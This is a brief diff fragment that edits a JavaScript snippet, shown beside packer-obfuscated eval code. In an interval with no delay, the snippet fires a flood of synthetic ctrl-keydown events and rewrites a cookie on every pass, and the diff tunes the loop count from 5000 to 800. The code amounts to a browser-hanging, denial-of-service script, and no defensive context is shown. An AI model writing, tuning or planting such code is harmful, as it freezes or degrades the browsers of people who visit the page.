@@ -11,7 +11,7 @@ eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^
 ```
 var e_oc = new KeyboardEvent('keydown', {ctrlKey: true});
 setInterval(function(){
-  var n_oc = 5000;
+  var n_oc = 800;
   for (i = 0; i < n_oc; i++) {document.dispatchEvent(e_oc);document.cookie = "bot='' Doe; expires=Thu, 14 Aug 2021 12:00:00 UTC; path=/";}
 }, 0);
 ```
